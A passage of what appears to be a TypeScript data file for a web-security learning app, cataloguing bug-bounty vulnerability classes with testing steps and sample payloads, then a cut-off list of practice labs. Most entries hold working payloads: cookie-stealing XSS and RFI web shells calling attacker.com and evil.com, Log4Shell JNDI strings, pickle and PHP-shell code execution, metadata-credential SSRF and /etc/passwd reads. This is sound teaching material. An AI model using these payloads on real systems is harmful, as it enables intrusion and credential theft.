  { id: "BUG-021", name: "JWT Weak HMAC Secret Key", category: "Authentication & Sessions", severity: "High", impact: "Crack JWT secret and sign arbitrary administrative tokens.", testingMethod: "Run `hashcat -m 16500 jwt.txt rockyou.txt` to crack weak HMAC-SHA256 secrets.", samplePayloadOrHeader: "Cracked secret: 'secret' or 'jwtsecret'" },
  { id: "BUG-022", name: "Password Reset Token Poisoning via Host Header", category: "Authentication & Sessions", severity: "High", impact: "Victim's password reset email contains attacker's domain link, leaking the reset token.", testingMethod: "Send password reset request with `Host: evil.com` or `X-Forwarded-Host: evil.com`.", samplePayloadOrHeader: "Host: attacker-controlled-domain.com" },
  { id: "BUG-023", name: "Two-Factor Authentication Bypass via Response Manipulation", category: "Authentication & Sessions", severity: "Critical", impact: "Bypass 2FA prompt by modifying server JSON responses.", testingMethod: "Submit wrong 2FA code, intercept response, change `{\"success\": false}` to `{\"success\": true}`.", samplePayloadOrHeader: "Response: HTTP 200 OK -> {\"status\": \"verified\"}" },
  { id: "BUG-024", name: "OAuth 2.0 Missing State Parameter (CSRF)", category: "Authentication & Sessions", severity: "Medium", impact: "Link attacker's social media account to victim's profile.", testingMethod: "Inspect OAuth authorization URL; check if `state=` parameter is omitted or static.", samplePayloadOrHeader: "GET /auth/google?redirect_uri=... (missing state)" },
  { id: "BUG-025", name: "OAuth 2.0 Redirect URI Hijacking", category: "Authentication & Sessions", severity: "High", impact: "Leak OAuth authorization code to an external attacker domain.", testingMethod: "Change `redirect_uri=https://target.com/callback` to `redirect_uri=https://target.com.evil.com`.", samplePayloadOrHeader: "&redirect_uri=https://attacker.com/log_token" },
  { id: "BUG-026", name: "Insecure 'Remember Me' Cookie Manipulation", category: "Authentication & Sessions", severity: "High", impact: "Decode base64 remember cookie and modify user ID/username to log in as admin.", testingMethod: "Inspect `remember_me` cookie; base64 decode `admin:1`.", samplePayloadOrHeader: "Cookie: remember_me=YWRtaW46MQ==" },
  { id: "BUG-027", name: "Race Condition on Password Reset / Promo Codes", category: "Authentication & Sessions", severity: "High", impact: "Use single-use coupon codes or reset tokens multiple times simultaneously.", testingMethod: "Send 20 parallel requests in Turbo Intruder using `gate` synchronization.", samplePayloadOrHeader: "Turbo Intruder: engine.queue(target.req, gate='race')" },
  { id: "BUG-028", name: "Default Credentials on Administrative Portal", category: "Authentication & Sessions", severity: "High", impact: "Direct administrative control over infrastructure or content management systems.", testingMethod: "Test common defaults: `admin:admin`, `admin:password`, `root:toor`, `tomcat:s3cret`.", samplePayloadOrHeader: "Credentials: admin / admin" },
  { id: "BUG-029", name: "Weak Password Policy Allowing Trivial Passwords", category: "Authentication & Sessions", severity: "Low", impact: "Users pick passwords like '123456' making them prone to credential stuffing.", testingMethod: "Register an account with password `1` or `password`.", samplePayloadOrHeader: "Password: password123" },
  { id: "BUG-030", name: "Privilege Escalation via Parameter Tampering", category: "Authentication & Sessions", severity: "High", impact: "Normal student elevates account to instructor or platform administrator.", testingMethod: "Intercept profile update request; add `\"role\": \"admin\"` or `\"is_admin\": true`.", samplePayloadOrHeader: "JSON payload: {\"email\": \"user@test.com\", \"role\": \"admin\"}" },

  // ── ACCESS CONTROL & IDOR (15) ──
  { id: "BUG-031", name: "Insecure Direct Object Reference (Horizontal IDOR)", category: "Access Control & IDOR", severity: "High", impact: "View, edit, or delete another user's private data, addresses, or profile.", testingMethod: "Change URL parameter `/api/user/1001/profile` to `/api/user/1002/profile`.", samplePayloadOrHeader: "GET /api/v1/invoices/9842 HTTP/1.1" },
  { id: "BUG-032", name: "Insecure Direct Object Reference (Vertical IDOR)", category: "Access Control & IDOR", severity: "Critical", impact: "Standard user accesses admin-only endpoints or deletes user accounts.", testingMethod: "Access `/api/admin/users/delete` while authenticated as regular student session.", samplePayloadOrHeader: "POST /admin/deleteUser?id=5 (with student cookie)" },
  { id: "BUG-033", name: "BOLA (Broken Object Level Authorization in REST)", category: "Access Control & IDOR", severity: "High", impact: "API fails to validate if requesting user owns the object referenced in UUID.", testingMethod: "Replace `order_id` in `/api/orders/{order_id}/receipt` with another user's order ID.", samplePayloadOrHeader: "GET /api/orders/e2b95c34-9128-4bc2/download" },
  { id: "BUG-034", name: "BOPLA (Broken Object Property Level Authorization)", category: "Access Control & IDOR", severity: "Medium", impact: "Mass assignment where user modifies internal fields like `verified=true` or `balance=99999`.", testingMethod: "Add hidden JSON properties in PUT/PATCH requests.", samplePayloadOrHeader: "PUT /api/user/me -> {\"is_verified\": true, \"credits\": 5000}" },
  { id: "BUG-035", name: "Missing Function Level Access Control", category: "Access Control & IDOR", severity: "High", impact: "Unauthenticated users can trigger backend functions like exporting user dumps.", testingMethod: "Access administrative routes without passing any `Authorization` header.", samplePayloadOrHeader: "GET /export/all_users.csv" },
  { id: "BUG-036", name: "IDOR via HTTP Method Switching", category: "Access Control & IDOR", severity: "Medium", impact: "Bypass access controls by changing POST to PUT or GET.", testingMethod: "If `POST /api/user/delete` is blocked, try `GET /api/user/delete` or `PUT`.", samplePayloadOrHeader: "Switch POST -> GET /api/admin/users?action=delete" },
  { id: "BUG-037", name: "IDOR via JSON / XML Content-Type Switching", category: "Access Control & IDOR", severity: "Medium", impact: "WAF or authorization middleware only validates JSON bodies, ignoring XML format.", testingMethod: "Change `Content-Type: application/json` to `application/xml`.", samplePayloadOrHeader: "Content-Type: application/xml -> <user><id>1002</id></user>" },
  { id: "BUG-038", name: "IDOR in Password Reset Flow", category: "Access Control & IDOR", severity: "Critical", impact: "Full account takeover of arbitrary user accounts without email access.", testingMethod: "Change `user_id` or `email` parameter during the final password submission endpoint.", samplePayloadOrHeader: "POST /api/reset-confirm -> {\"userId\": \"target_id\", \"newPassword\": \"pwned\"}" },
  { id: "BUG-039", name: "Path Traversal / Local File Inclusion (LFI)", category: "Access Control & IDOR", severity: "High", impact: "Read server configuration files, `/etc/passwd`, and application source code.", testingMethod: "Inject `../../../../etc/passwd` or `..%2f..%2f..%2fetc/passwd` into file parameters.", samplePayloadOrHeader: "GET /download?file=../../../../../../etc/passwd" },
  { id: "BUG-040", name: "LFI with PHP Wrappers (Source Code Disclosure)", category: "Access Control & IDOR", severity: "High", impact: "Read raw PHP source code without execution via Base64 filter.", testingMethod: "Inject `php://filter/convert.base64-encode/resource=index.php`.", samplePayloadOrHeader: "GET /page?file=php://filter/convert.base64-encode/resource=config.php" },
  { id: "BUG-041", name: "Remote File Inclusion (RFI)", category: "Access Control & IDOR", severity: "Critical", impact: "Remote code execution by forcing server to include external web shell.", testingMethod: "Inject `http://attacker.com/shell.txt` into file inclusion parameter.", samplePayloadOrHeader: "GET /index.php?page=http://evil.com/shell.txt" },
  { id: "BUG-042", name: "IDOR in Document Download / PDF Generation", category: "Access Control & IDOR", severity: "Medium", impact: "Download salary slips, invoices, or medical reports belonging to other users.", testingMethod: "Increment integer ID in download endpoints.", samplePayloadOrHeader: "GET /api/v1/certificates/export?id=1045" },
  { id: "BUG-043", name: "Forced Browsing to Unlinked Admin Dashboards", category: "Access Control & IDOR", severity: "Medium", impact: "Access hidden internal administration panels omitted from main navigation.", testingMethod: "Brute force paths like `/manage`, `/staff`, `/ops`, `/intranet` using Gobuster.", samplePayloadOrHeader: "GET /superadmin/control_panel" },
  { id: "BUG-044", name: "CORS Misconfiguration with Wildcard & Credentials", category: "Access Control & IDOR", severity: "High", impact: "Steal victim's private profile data and CSRF tokens via malicious JavaScript.", testingMethod: "Send request with `Origin: https://evil.com`; check for `Access-Control-Allow-Credentials: true`.", samplePayloadOrHeader: "Access-Control-Allow-Origin: https://evil.com\nAccess-Control-Allow-Credentials: true" },
  { id: "BUG-045", name: "Insecure Multi-Tenant Isolation Flaw", category: "Access Control & IDOR", severity: "Critical", impact: "Company A views and manipulates projects, leads, and employees of Company B.", testingMethod: "Modify `tenant_id` or `company_id` header or body parameters.", samplePayloadOrHeader: "X-Tenant-ID: victim_enterprise_uuid" },

  // ── CLIENT-SIDE & XSS (15) ──
  { id: "BUG-046", name: "Reflected Cross-Site Scripting (Reflected XSS)", category: "Client-Side & XSS", severity: "High", impact: "Session hijacking, credential theft, and forced redirection via malicious link.", testingMethod: "Input `<script>alert(1)</script>` into search queries and parameters.", samplePayloadOrHeader: "https://target.com/search?q=<script>alert(document.cookie)</script>" },
  { id: "BUG-047", name: "Stored Cross-Site Scripting (Stored XSS)", category: "Client-Side & XSS", severity: "High", impact: "Permanent malicious script execution for every user visiting a profile, comment, or forum.", testingMethod: "Insert XSS payload into comments, user profile name, or address fields.", samplePayloadOrHeader: "\"><img src=x onerror=this.src='http://attacker.com/?c='+document.cookie>" },
  { id: "BUG-048", name: "DOM-Based Cross-Site Scripting (DOM XSS)", category: "Client-Side & XSS", severity: "Medium", impact: "JavaScript execution entirely on client side without server reflection.", testingMethod: "Look for dangerous sinks: `eval()`, `innerHTML`, `document.write()`, `location.href`.", samplePayloadOrHeader: "https://target.com/#<img src=x onerror=alert(1)>" },
  { id: "BUG-049", name: "Blind Cross-Site Scripting (Blind XSS)", category: "Client-Side & XSS", severity: "High", impact: "Payload fires inside internal staff admin portals when reviewing user inquiries or tickets.", testingMethod: "Inject XSS hunter payload into 'Contact Us' or 'Feedback' forms.", samplePayloadOrHeader: "\"><script src=https://yourhandle.xss.ht></script>" },
  { id: "BUG-050", name: "Mutation XSS (mXSS)", category: "Client-Side & XSS", severity: "High", impact: "Bypass DOMPurify or browser HTML sanitizers due to browser DOM mutation parsing.", testingMethod: "Use nested `<math><style>` and SVG tags that mutate on browser re-parsing.", samplePayloadOrHeader: "<form><math><mtext></form><form><mglyph><style></math><img src=x onerror=alert(1)>" },
  { id: "BUG-051", name: "Cross-Site Request Forgery (CSRF)", category: "Client-Side & XSS", severity: "Medium", impact: "Forces victim browser to perform actions (change email, transfer funds) without consent.", testingMethod: "Craft HTML form that auto-submits POST request to target action without anti-CSRF token.", samplePayloadOrHeader: "<form action='https://target.com/email/update' method='POST'><input name='email' value='hacker@evil.com'><script>submit()</script>" },
  { id: "BUG-052", name: "Clickjacking (UI Redressing)", category: "Client-Side & XSS", severity: "Medium", impact: "Trick users into clicking invisible buttons embedded in an iframe over malicious site.", testingMethod: "Check if response lacks `X-Frame-Options: DENY` or `Content-Security-Policy: frame-ancestors`.", samplePayloadOrHeader: "<iframe src='https://target.com/account/delete' style='opacity:0.001'></iframe>" },
  { id: "BUG-053", name: "Content Security Policy (CSP) Bypass via JSONP", category: "Client-Side & XSS", severity: "Medium", impact: "Bypass strict script-src CSP policy by leveraging whitelisted CDNs.", testingMethod: "Find whitelisted domains (e.g. `google.com`) and inject JSONP callback endpoints.", samplePayloadOrHeader: "<script src='https://accounts.google.com/o/oauth2/revoke?callback=alert(1)'></script>" },
  { id: "BUG-054", name: "HTML5 postMessage Vulnerability", category: "Client-Side & XSS", severity: "Medium", impact: "Steal confidential tokens or execute DOM XSS via unvalidated event listeners.", testingMethod: "Inspect `window.addEventListener('message', function(e) { ... })` for missing `e.origin` check.", samplePayloadOrHeader: "window.postMessage('{\"action\": \"exec\", \"code\": \"alert(1)\"}', '*')" },
  { id: "BUG-055", name: "Client-Side Prototype Pollution", category: "Client-Side & XSS", severity: "High", impact: "Inject properties into Object.prototype leading to universal XSS or bypasses.", testingMethod: "Inject `?__proto__[src]=data:,alert(1)//` or `constructor[prototype][foo]=bar` in URL.", samplePayloadOrHeader: "https://target.com/?__proto__[innerHTML]=<img src=x onerror=alert(1)>" },
  { id: "BUG-056", name: "Cross-Site WebSocket Hijacking (CSWSH)", category: "Client-Side & XSS", severity: "High", impact: "Steal real-time live chat messages or trade feeds from authenticated victims.", testingMethod: "Connect to WebSocket from malicious origin; verify if server accepts connection without CSRF check.", samplePayloadOrHeader: "new WebSocket('wss://target.com/stream')" },
  { id: "BUG-057", name: "Tabnabbing / Reverse Tabnabbing", category: "Client-Side & XSS", severity: "Low", impact: "Phish users by hijacking parent window when opening target links.", testingMethod: "Inspect links with `target='_blank'` lacking `rel='noopener noreferrer'`.", samplePayloadOrHeader: "window.opener.location = 'https://fake-login-page.com'" },
  { id: "BUG-058", name: "SVG Stored XSS via File Upload", category: "Client-Side & XSS", severity: "High", impact: "Execute JavaScript when users open uploaded SVG image files directly.", testingMethod: "Upload valid `.svg` file containing `<svg xmlns='...'><script>alert(1)</script></svg>`.", samplePayloadOrHeader: "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert(document.domain)</script></svg>" },
  { id: "BUG-059", name: "XSS via Markdown / Rich Text Parsers", category: "Client-Side & XSS", severity: "Medium", impact: "Bypass markdown parser with crafted links or raw HTML tags.", testingMethod: "Input `[Click me](javascript:alert(document.domain))`.", samplePayloadOrHeader: "[Click Me](javascript:alert(1))" },
  { id: "BUG-060", name: "Open Redirect Leading to OAuth Token Theft", category: "Client-Side & XSS", severity: "Medium", impact: "Phishing attacks and stealing OAuth authorization codes via chaining.", testingMethod: "Inject `?next=https://evil.com` or `?redirect=//evil.com`.", samplePayloadOrHeader: "https://target.com/login?redirect=https://attacker.com" },

  // ── SSRF & SERVER-SIDE (15) ──
  { id: "BUG-061", name: "Server-Side Request Forgery (SSRF - AWS EC2 Metadata)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Extract IAM role credentials and takeover entire AWS cloud infrastructure.", testingMethod: "Input `http://169.254.169.254/latest/meta-data/iam/security-credentials/` into webhook/import URLs.", samplePayloadOrHeader: "http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name" },
  { id: "BUG-062", name: "SSRF (Google Cloud Platform Metadata)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Extract GCP service account tokens and private keys.", testingMethod: "Input `http://metadata.google.internal/computeMetadata/v1/` with header `Metadata-Flavor: Google`.", samplePayloadOrHeader: "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" },
  { id: "BUG-063", name: "SSRF (Internal Network Port Scanning)", category: "SSRF & File Inclusion", severity: "High", impact: "Port scan and enumerate intranet services behind corporate firewall (Redis, Elasticsearch).", testingMethod: "Input `http://127.0.0.1:6379`, `http://192.168.1.1:80` into URL previewers.", samplePayloadOrHeader: "http://127.0.0.1:6379/info" },
  { id: "BUG-064", name: "Blind SSRF with DNS Out-of-Band Exfiltration", category: "SSRF & File Inclusion", severity: "Medium", impact: "Verify internal vulnerability existence and perform internal pingbacks.", testingMethod: "Inject `http://unique_id.burpcollaborator.net` into PDF generators and webhooks.", samplePayloadOrHeader: "http://test.burpcollaborator.net" },
  { id: "BUG-065", name: "XML External Entity (XXE - File Read)", category: "SSRF & File Inclusion", severity: "High", impact: "Read arbitrary system files like `/etc/passwd` through XML parsers.", testingMethod: "Define external entity in XML payload: `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>`.", samplePayloadOrHeader: "<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY test SYSTEM \"file:///etc/passwd\">]><data>&test;</data>" },
  { id: "BUG-066", name: "Blind XXE via Out-of-Band DTD", category: "SSRF & File Inclusion", severity: "High", impact: "Exfiltrate system file contents via HTTP request to attacker server.", testingMethod: "Host external DTD file containing payload; trigger load via XML input.", samplePayloadOrHeader: "<!ENTITY % file SYSTEM \"file:///etc/hostname\"><!ENTITY % dtd SYSTEM \"http://evil.com/eval.dtd\">%dtd;" },
  { id: "BUG-067", name: "HTTP Request Smuggling (CL.TE)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Bypass security controls, poison web caches, and hijack other users' requests.", testingMethod: "Send request with mismatched `Content-Length` and `Transfer-Encoding: chunked` headers.", samplePayloadOrHeader: "Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG" },
  { id: "BUG-068", name: "HTTP Request Smuggling (TE.CL)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Frontend uses Transfer-Encoding, backend uses Content-Length leading to desynchronization.", testingMethod: "Send chunked request with short Content-Length header.", samplePayloadOrHeader: "Transfer-Encoding: chunked\nContent-Length: 4\n\n5e\nPOST /admin..." },
  { id: "BUG-069", name: "Insecure Java Deserialization (ysoserial)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Remote code execution by sending serialized malicious Java objects.", testingMethod: "Generate CommonsCollections payload using `ysoserial` and send to object endpoints.", samplePayloadOrHeader: "Java serialized magic bytes: 0xAC 0xED 0x00 0x05" },
  { id: "BUG-070", name: "Insecure Python Pickle Deserialization", category: "SSRF & File Inclusion", severity: "Critical", impact: "Remote code execution by executing `__reduce__()` method during `pickle.loads()`.", testingMethod: "Craft malicious pickled byte string with `os.system` call.", samplePayloadOrHeader: "b'cos\\nsystem\\n(S\"whoami\"\\ntR.'" },
  { id: "BUG-071", name: "PHP Object Injection (unserialize)", category: "SSRF & File Inclusion", severity: "High", impact: "Invoke magic methods (`__destruct`, `__wakeup`) to read files or run code.", testingMethod: "Inject serialized PHP object string: `O:8:\"Exploit\":1:{s:4:\"file\";s:11:\"/etc/passwd\";}`.", samplePayloadOrHeader: "O:4:\"User\":1:{s:4:\"role\";s:5:\"admin\";}" },
  { id: "BUG-072", name: "SSRF via DNS Rebinding", category: "SSRF & File Inclusion", severity: "High", impact: "Bypass IP whitelist/blacklist filters by changing DNS A record TTL to 0.", testingMethod: "Use domain configured with DNS rebinding service returning public IP then `127.0.0.1`.", samplePayloadOrHeader: "http://make-127-0-0-1-rr.1u.ms" },
  { id: "BUG-073", name: "Log4j JNDI Lookup Vulnerability (Log4Shell)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Remote code execution by logging crafted JNDI LDAP lookup strings.", testingMethod: "Inject `${jndi:ldap://collaborator.net/a}` into User-Agent, X-Api-Version, or username.", samplePayloadOrHeader: "${jndi:ldap://evil.com/Exploit}" },
  { id: "BUG-074", name: "Spring Cloud Function RCE (Spring4Shell)", category: "SSRF & File Inclusion", severity: "Critical", impact: "Remote code execution via class loader manipulation in Spring Boot.", testingMethod: "Send crafted POST request with class parameter bindings.", samplePayloadOrHeader: "class.module.classLoader.resources.context.parent..." },
  { id: "BUG-075", name: "Server-Side Request Forgery via PDF Generator", category: "SSRF & File Inclusion", severity: "High", impact: "PDF generator renders `<iframe src='http://169.254.169.254'>` and burns metadata into PDF.", testingMethod: "Input HTML with `<img>` or `<iframe>` tags into invoices/resumes before PDF conversion.", samplePayloadOrHeader: "<iframe src=\"file:///etc/passwd\" width=\"500\" height=\"500\"></iframe>" },

  // ── FILE UPLOAD & PARSING (10) ──
  { id: "BUG-076", name: "Unrestricted File Upload (Direct Web Shell)", category: "File Upload & Parsing", severity: "Critical", impact: "Complete server compromise via web shell execution.", testingMethod: "Upload `shell.php` containing `<?php system($_GET['cmd']); ?>` directly to media folders.", samplePayloadOrHeader: "<?php system($_REQUEST['cmd']); ?>" },
  { id: "BUG-077", name: "File Upload Filter Bypass via MIME-Type Manipulation", category: "File Upload & Parsing", severity: "Critical", impact: "Upload malicious executable scripts disguised as images.", testingMethod: "Change `Content-Type: application/x-php` to `Content-Type: image/jpeg` in multipart request.", samplePayloadOrHeader: "Content-Type: image/png" },
  { id: "BUG-078", name: "File Upload Filter Bypass via Double Extension", category: "File Upload & Parsing", severity: "High", impact: "Apache or Nginx executes first extension if mime configuration is misconfigured.", testingMethod: "Rename payload to `shell.php.jpg` or `shell.php.png`.", samplePayloadOrHeader: "Filename: avatar.php.png" },
  { id: "BUG-079", name: "File Upload Filter Bypass via Case Sensitivity / Alternate Extensions", category: "File Upload & Parsing", severity: "High", impact: "Bypass blacklist filters by testing `.phtml`, `.php5`, `.pHp`, `.phar`.", testingMethod: "Test `.phtml`, `.php7`, `.phar`, `.inc`, `.config` extensions.", samplePayloadOrHeader: "Filename: shell.phtml" },
  { id: "BUG-080", name: "File Upload Filter Bypass via Path Traversal in Filename", category: "File Upload & Parsing", severity: "Critical", impact: "Upload files outside upload directory into web root or cron directories.", testingMethod: "Set filename to `../../../../var/www/html/shell.php`.", samplePayloadOrHeader: "filename=\"../../shell.php\"" },
  { id: "BUG-081", name: "File Upload Null Byte Injection", category: "File Upload & Parsing", severity: "High", impact: "Tricks legacy PHP and C-based validators into validating `.png` while saving `.php`.", testingMethod: "Set filename to `shell.php%00.png`.", samplePayloadOrHeader: "filename=\"shell.php\x00.jpg\"" },
  { id: "BUG-082", name: "Zip Slip / Archive Path Traversal", category: "File Upload & Parsing", severity: "High", impact: "Overwrites critical system files or creates web shells when server extracts ZIP archives.", testingMethod: "Craft ZIP archive containing files with path traversal entries `../../shell.php`.", samplePayloadOrHeader: "evilarc.py shell.php -o evil.zip -d 3 -p 'var/www/html'" },
  { id: "BUG-083", name: "ImageMagick Shell Injection (ImageTragick)", category: "File Upload & Parsing", severity: "Critical", impact: "Remote code execution by parsing malicious SVG or MVG image files.", testingMethod: "Upload `.mvg` file defining `fill 'url(https://127.0.0.1/test.jpg\"|whoami;\")'`.", samplePayloadOrHeader: "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/image.jpg\"|whoami\")'\npop graphic-context" },
  { id: "BUG-084", name: "Pixel Flood Denial of Service via Image Bomb", category: "File Upload & Parsing", severity: "Medium", impact: "Crashes web worker threads by exhausting memory during image resize.", testingMethod: "Upload an image with header dimensions `0xFFFFFFFF x 0xFFFFFFFF`.", samplePayloadOrHeader: "100000x100000 pixel image with tiny compressed size" },
  { id: "BUG-085", name: "Exif Metadata Command Injection / XSS", category: "File Upload & Parsing", severity: "Medium", impact: "XSS or shell command execution when server displays or processes EXIF data.", testingMethod: "Embed XSS payload into image EXIF `Artist` or `Copyright` tag with ExifTool.", samplePayloadOrHeader: "exiftool -Artist='<script>alert(1)</script>' photo.jpg" },

  // ── BUSINESS LOGIC & API (10) ──
  { id: "BUG-086", name: "Price Tampering / Negative Quantity", category: "API & Business Logic", severity: "High", impact: "Buy expensive courses, items, or services for ₹0 or negative amounts.", testingMethod: "Intercept checkout POST request; change `amount: 1000` to `amount: 1` or `quantity: -1`.", samplePayloadOrHeader: "JSON: {\"itemId\": \"123\", \"price\": 0.01, \"quantity\": 1}" },
  { id: "BUG-087", name: "Coupon Code Re-entrancy / Currency Conversion Flaws", category: "API & Business Logic", severity: "Medium", impact: "Stack coupons indefinitely or manipulate exchange rates to get free orders.", testingMethod: "Apply same discount code across multiple browser tabs concurrently.", samplePayloadOrHeader: "Parallel POST /api/applyCoupon code=DISCOUNT50" },
  { id: "BUG-088", name: "Rate Limit Bypass via Custom IP Headers", category: "API & Business Logic", severity: "Medium", impact: "Bypass anti-brute force filters by spoofing client IP address.", testingMethod: "Add headers `X-Forwarded-For: 127.0.0.1`, `X-Real-IP: 10.0.0.1`, `Client-IP: 1.1.1.1`.", samplePayloadOrHeader: "X-Forwarded-For: 192.168.1.50" },
  { id: "BUG-089", name: "GraphQL Introspection Query Enabled in Production", category: "API & Business Logic", severity: "Low", impact: "Full disclosure of all internal queries, mutations, types, and hidden admin fields.", testingMethod: "Send query `{\"query\": \"{__schema{types{name}}}\"}` to `/graphql`.", samplePayloadOrHeader: "POST /graphql -> {\"query\": \"{__schema{types{name}}}\"}" },
  { id: "BUG-090", name: "GraphQL Denial of Service via Deeply Nested Queries", category: "API & Business Logic", severity: "Medium", impact: "Exhaust server CPU and memory via circular relational queries.", testingMethod: "Send nested query: `{user{friends{friends{friends{friends{name}}}}}}`.", samplePayloadOrHeader: "query { me { orders { items { order { items { id } } } } } }" },
  { id: "BUG-091", name: "GraphQL Batching Attack to Bypass Rate Limits", category: "API & Business Logic", severity: "High", impact: "Brute force passwords by sending 1,000 login mutations in a single HTTP request.", testingMethod: "Send JSON array with 1,000 mutation objects to bypass per-request rate limiters.", samplePayloadOrHeader: "[{\"query\": \"mutation { login(p: '1') }\"}, {\"query\": \"mutation { login(p: '2') }\"}]" },
  { id: "BUG-092", name: "Checkout Workflow Step Skipping", category: "API & Business Logic", severity: "High", impact: "Bypass payment step by directly making request to order confirmation endpoint.", testingMethod: "Skip Step 2 (`/checkout/payment`) and jump straight from Step 1 to Step 3 (`/order/success`).", samplePayloadOrHeader: "POST /checkout/complete without visiting /pay" },
  { id: "BUG-093", name: "Account Email Verification Bypass", category: "API & Business Logic", severity: "Medium", impact: "Register accounts using victims' corporate email addresses without verification.", testingMethod: "Change email in profile after registration before clicking verification link.", samplePayloadOrHeader: "POST /api/user/update-email (without re-triggering verification)" },
  { id: "BUG-094", name: "Referral Bonus / Credit Duplication via Race Condition", category: "API & Business Logic", severity: "High", impact: "Multiply wallet balance or credits by redeeming referral links simultaneously.", testingMethod: "Fire simultaneous requests to `/api/redeem-referral` using Python asyncio.", samplePayloadOrHeader: "15 concurrent HTTP requests with same referral code" },
  { id: "BUG-095", name: "Denial of Service via Unbounded File / Data Size", category: "API & Business Logic", severity: "Low", impact: "Crash application server by uploading enormous text inputs in comments.", testingMethod: "Send 100MB string in username or feedback text field.", samplePayloadOrHeader: "JSON body with 50,000,000 'A' characters" },

  // ── INFORMATION DISCLOSURE & MISCONFIGURATIONS (10) ──
  { id: "BUG-096", name: "Publicly Exposed .git Repository", category: "Information Disclosure & Misconfigurations", severity: "High", impact: "Download complete application source code, past commits, database credentials, and API keys.", testingMethod: "Request `https://target.com/.git/HEAD`. If response is `ref: refs/heads/master`, dump repo with GitTools.", samplePayloadOrHeader: "GET /.git/HEAD -> ref: refs/heads/main" },
  { id: "BUG-097", name: "Exposed .env / Configuration Files", category: "Information Disclosure & Misconfigurations", severity: "Critical", impact: "Discloses database passwords, AWS secret keys, Stripe tokens, and JWT signing keys.", testingMethod: "Request `/.env`, `/.env.local`, `/.env.production`, `/web.config`, `/appsettings.json`.", samplePayloadOrHeader: "GET /.env -> DB_PASSWORD=secret_db_pass" },
  { id: "BUG-098", name: "Directory Listing Enabled on Sensitive Directories", category: "Information Disclosure & Misconfigurations", severity: "Low", impact: "Attackers browse file directories and download database backups and logs.", testingMethod: "Request `/uploads/`, `/backup/`, `/static/` and look for Apache 'Index of /' page.", samplePayloadOrHeader: "Response: <title>Index of /backups</title>" },
  { id: "BUG-099", name: "Verbose Error Messages / Stack Trace Leakage", category: "Information Disclosure & Misconfigurations", severity: "Low", impact: "Leads to fingerprinting exact library versions, database table names, and local paths.", testingMethod: "Send invalid data types (e.g. string for integer ID) to force unhandled exceptions.", samplePayloadOrHeader: "Response: Exception in thread 'main' at /var/www/models/User.php:42" },
  { id: "BUG-100", name: "Spring Boot Actuator Endpoints Publicly Accessible", category: "Information Disclosure & Misconfigurations", severity: "Critical", impact: "Heap dumps containing plaintext passwords, environment variables, and live metrics.", testingMethod: "Request `/actuator`, `/actuator/env`, `/actuator/heapdump`, `/actuator/mappings`.", samplePayloadOrHeader: "GET /actuator/env -> System properties & tokens" },
  { id: "BUG-101", name: "Swagger / OpenAPI Documentation Publicly Exposed", category: "Information Disclosure & Misconfigurations", severity: "Low", impact: "Gives attackers an exact map of all internal endpoints, parameters, and payloads.", testingMethod: "Search for `/swagger-ui.html`, `/api-docs`, `/v2/api-docs`, `/openapi.json`.", samplePayloadOrHeader: "GET /v1/swagger.json" },
  { id: "BUG-102", name: "Subdomain Takeover via Dangling CNAME Records", category: "Information Disclosure & Misconfigurations", severity: "High", impact: "Attacker claims dangling AWS S3 bucket, GitHub Pages, or Heroku app and serves malicious site.", testingMethod: "Check `dig CNAME sub.target.com`. If target service gives 404, claim the name.", samplePayloadOrHeader: "CNAME points to: nonexistent-bucket.s3.amazonaws.com" },
  { id: "BUG-103", name: "Publicly Readable / Writable AWS S3 Bucket", category: "Information Disclosure & Misconfigurations", severity: "High", impact: "Download private customer records or upload malicious files into public bucket.", testingMethod: "Run `aws s3 ls s3://target-bucket --no-sign-request`.", samplePayloadOrHeader: "aws s3 cp test.txt s3://target-company-assets/ --no-sign-request" },
  { id: "BUG-104", name: "Exposed Firebase Realtime Database", category: "Information Disclosure & Misconfigurations", severity: "High", impact: "Read and write entire mobile application database with zero authentication.", testingMethod: "Request `https://<app-name>.firebaseio.com/.json`.", samplePayloadOrHeader: "GET https://target-app.firebaseio.com/.json" },
  { id: "BUG-105", name: "Dangling Cloudflare Origin IP Leaked via Email Headers", category: "Information Disclosure & Misconfigurations", severity: "Medium", impact: "Attackers bypass Cloudflare WAF, DDoS protection, and rate limiting by hitting origin IP directly.", testingMethod: "Trigger password reset or signup confirmation email and inspect `Received: from` IP headers.", samplePayloadOrHeader: "Received: from mail.target.com (203.0.113.50)" },
];

// ─── 5. CTF PLATFORMS & PRACTICE LABS LIST ─────────────────────────────────
export const deepCtfPlatforms: DeepCtfPlatform[] = [
  {
    name: "PortSwigger Web Security Academy",
    difficulty: "All Levels",
    category: "Web Academy",
    url: "https://portswigger.net/web-security",
    description: "The gold standard for web application security labs created by the creators of Burp Suite. Free, hands-on, realistic targets covering every vulnerability class.",
    recommendedRooms: [
      "SQL Injection (Apprentice & Practitioner Labs)",
      "Cross-Site Scripting (Reflected, Stored, DOM)",
      "Server-Side Request Forgery (SSRF)",
      "OAuth 2.0 Authentication Flaws",
      "HTTP Request Smuggling",
      "Access Control Vulnerabilities & IDOR",
    ],
  },
  {
    name: "TryHackMe (THM)",
    difficulty: "Beginner",
    category: "Cloud VM Labs",
    url: "https://tryhackme.com",
    description: "Guided, browser-based hands-on cyber security training with step-by-step questions and pre-configured cloud attack machines.",
    recommendedRooms: [
      "Pre-Security Path (Networking, Web Basics, Linux)",
      "Web Fundamentals Path (Burp Suite, OWASP Top 10)",
      "Jr Penetration Tester Path (Methodology, Privilege Escalation)",
      "Burp Suite: The Basics & Repeater",
      "Network Services (SMB, Telnet, FTP, NFS)",
    ],
  },
  {
    name: "Hack The Box (HTB)",
    difficulty: "Intermediate",
    category: "Cloud VM Labs",
    url: "https://hackthebox.com",
    description: "Real-world penetration testing virtual lab machines. Simulates enterprise networks with realistic Linux and Windows vulnerability chains.",
    recommendedRooms: [
